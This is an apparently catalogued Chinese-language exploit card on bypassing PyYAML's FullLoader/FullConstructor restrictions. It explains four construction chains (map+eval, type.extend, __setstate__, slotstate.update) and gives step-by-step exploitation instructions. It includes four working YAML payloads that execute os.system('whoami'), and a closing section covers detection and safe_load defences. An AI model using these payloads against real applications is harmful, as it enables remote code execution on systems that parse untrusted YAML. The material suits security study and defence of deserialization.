---
id: web-python-deserialization-pyyaml-fullconstructor-bypass-object-new
title: PyYAML FullConstructor 限制绕过：object/new + map/eval、type.extend、__setstate__ 与 update 四条构造链
type: scenario
domain: web
path: web/python/deserialization
technique: pyyaml-fullconstructor-bypass-object-new
aliases:
- PyYAML FullLoader 绕过
- FullConstructor bypass
- yaml object/new 绕过
- PyYAML map eval
- PyYAML extend exec
- PyYAML setstate
- PyYAML update slotstate
tags:
- python
- pyyaml
- yaml
- deserialization
- full-loader
- bypass
- rce
- object-new
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T11:37:48+08:00'
  notes: 已对照原文核对四条构造链与版本差异描述；原文仅给出 payload 与断点分析、未在本机完整复跑，置信度保持 medium；未设置版本区间。
---

## 一句话结论

PyYAML 5.1 之后默认的 `FullLoader`/`FullConstructor` 会禁用 `!!python/object/apply` 并限制 `make_python_instance`，但仍保留 `!!python/object/new` 与 `!!python/name`；攻击者可以用 `tuple(map(eval, [...]))` 强制求值，或用 `type` 动态构造带 `extend`/`__setstate__` 的类，或利用无 `__setstate__` 对象的 `slotstate.update` 回退路径，在不使用 `object/apply` 的情况下调用 `eval`/`exec`，实现代码执行。

## 原理

- PyYAML <5.1 的默认构造器是 `Constructor`，直接支持 `!!python/object/apply:os.system ["cmd"]`、`!!python/object/new:subprocess.check_output [...]` 等标签，解析即执行；`yaml.load(data)` 默认就是不安全的。
- PyYAML 5.1 起把构造器拆分为 `BaseConstructor`、`SafeConstructor`、`FullConstructor`、`UnsafeConstructor`、`Constructor`。5.1–5.2 的 `yaml.load(data)` 默认使用 `FullConstructor`：它禁止 `!!python/object/apply`，并在 `make_python_instance` 中加入 `if not (unsafe or isinstance(cls, type))` 的限制，要求加载的 `module.name` 是类（如 `int`、`str`）而不是任意函数。
- 绕过一（map + eval）：`!!python/object/new:tuple` 与 `!!python/object/new:map` 构造的都是 `type` 实例，满足 `isinstance(cls, type)`；`!!python/name:eval` 只引用函数对象，不经过实例化检查。`map(eval, ["__import__('os').system('whoami')"])` 返回惰性迭代器，外层 `tuple(...)`（也可换 `list`/`set`/`bytes`/`frozenset`）强制消费迭代器，从而调用 `eval` 执行字符串。
- 绕过二（type.extend）：`!!python/object/new:type` 调用 `type(name, bases, dict)` 动态创建类，第三个参数可把 `extend` 属性设为 `!!python/name:exec`；YAML 构造器在对象带 `listitems` 时会调用实例的 `extend(listitems)`，于是 `exec(payload)` 被执行。
- 绕过三（__setstate__）：在同一 `type` 构造基础上，把类字典设为 `{"__setstate__": !!python/name:exec}`，并给出 `state: "<payload>"`；构造器检测到 `__setstate__` 后调用 `instance.__setstate__(state)`，等价于 `exec(payload)`。
- 绕过四（update）：若对象既没有 `__setstate__` 也没有 `__dict__`，构造器会走 `slotstate.update(...)` 回退。`!!python/object/new:str` 配合 `state: !!python/tuple [payload, !!python/object/new:staticmethod ...]`，内层 `staticmethod` 的 state 设为 `{update: !!python/name:eval, items: !!python/name:list}`，最终调用 `eval`/`list` 处理 payload。
- 版本差异：PyYAML >=5.2 只额外支持 `!!python/name`、`!!python/object`、`!!python/object/new`、`!!python/module`，不支持 apply；>=5.3.1 增加过滤机制；>=5.4 又支持 name/object/apply/object/new；>=6.0 要求显式指定 Loader。原文也指出部分尝试会失败（如 `!!python/object/apply:subprocess.Popen` 找不到构造器、`list`/`set` 的 `object/new` 会忽略参数），因此每条链都依赖具体版本与构造器实现。

## 触发条件

- 应用使用 `yaml.load(data)`（默认 FullLoader）或显式 `yaml.load(data, Loader=yaml.FullLoader)` 解析攻击者可控的 YAML。
- PyYAML 版本处于 FullConstructor 生效区间（约 5.1–5.4/6.x 的 FullLoader 行为），且目标环境已导入/可访问 `eval`、`exec`、`map`、`tuple`、`type`、`staticmethod` 等内建对象。
- 应用没有在解析前拒绝 `!!python/*` 标签，也没有使用 `safe_load`。
- 攻击者能提交多行 YAML（或 JSON 字符串中的真实换行），使标签与参数结构被正确解析。

## 利用步骤

1. 先确认解析器版本与默认 Loader：提交 `!!python/object/apply:os.system ["id"]`，若报“could not determine a constructor for the tag”则说明 apply 被禁用，进入绕过。
2. 尝试 map + eval 链：构造 `!!python/object/new:tuple` 包裹 `!!python/object/new:map`，参数为 `!!python/name:eval` 与待执行字符串列表；观察命令是否执行。
3. 若 map 链被过滤，尝试 type.extend 链：用 `!!python/object/new:type` 创建带 `extend: !!python/name:exec` 的类，`listitems` 放 payload。
4. 若 extend 被限制，尝试 `__setstate__` 链：同一 type 构造，类字典改为 `{"__setstate__": !!python/name:exec}`，`state` 放 payload。
5. 若仍失败，尝试 update 链：`!!python/object/new:str` 加 `state` 元组与 `staticmethod` 的 `update`/`items` 映射。
6. 成功后用命令回连或写文件验证；根据目标版本调整标签组合。

## PoC

map + eval：

```yaml
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - ["__import__('os').system('whoami')"]
```

type.extend：

```yaml
!!python/object/new:type
args:
  - test
  - !!python/tuple []
  - {"extend": !!python/name:exec }
listitems: "__import__('os').system('whoami')"
```

__setstate__：

```yaml
!!python/object/new:type
args:
  - test
  - !!python/tuple []
  - {"__setstate__": !!python/name:exec }
state: "__import__('os').system('whoami')"
```

update：

```yaml
!!python/object/new:str
    args: []
    state: !!python/tuple
      - "__import__('os').system('whoami')"
      - !!python/object/new:staticmethod
        args: []
        state:
          update: !!python/name:eval
          items: !!python/name:list
```

说明：以上为该类构造链的最小结构，实际可用性取决于 PyYAML 版本；原文未在本机独立复跑全部四条链，PoC 未在目标环境执行。

## 变体与关联

- 直接路径：PyYAML <5.1 或显式 `yaml.load(..., Loader=yaml.UnsafeLoader)`/`yaml.unsafe_load` 可直接用 `!!python/object/apply:os.system`，无需绕过。
- 标签变体：`!!python/object`、`!!python/module`、`!!python/name`；`%TAG` 指令可把 `tag:yaml.org,2002:python/` 起别名，绕过只匹配 `!!python` 字面量的 WAF（见关联卡）。
- 关联：`web-python-deser-pyyaml-tag-directive-waf-bypass-linecache`（WAF 关键字绕过）、`web-python-deserialization-feast-kubernetes-materializer-yaml-load-rce`（Feast 的 `yaml.Loader` 直接 RCE）、`web-java-deser-tarzancms-snakeyaml-scriptenginemanager-rce`（Java SnakeYAML 同类风险）。
- 边界：`yaml.safe_load`、`SafeLoader`、解析前的标签白名单/字符过滤可阻断全部四条链；PyYAML 版本与构造器差异会导致部分链失效，需要按目标版本实测。

## 检测与防御

- 直接使用 `yaml.safe_load`/`SafeLoader`，不要对不可信输入调用 `yaml.load`/`unsafe_load`/`full_load`。
- 在解析前对 YAML 文本做标签白名单：只允许基础类型，拒绝任何 `!!python/`、`tag:yaml.org,2002:python/` 以及 `%TAG` 自定义句柄；WAF 应解析/规范化 YAML 而不是只匹配字面量。
- 升级 PyYAML 到当前版本并显式指定 `SafeLoader`；不要依赖“默认 FullLoader 已足够安全”的假设，历史版本存在多条构造链。
- 检测：输入中出现 `object/new`、`object/apply`、`python/name`、`map`、`eval`、`extend`、`__setstate__`、`slotstate`、`update` 等组合；YAML 解析异常、构造任意类/函数调用的日志；进程启动 `whoami`/`id` 等异常子进程。
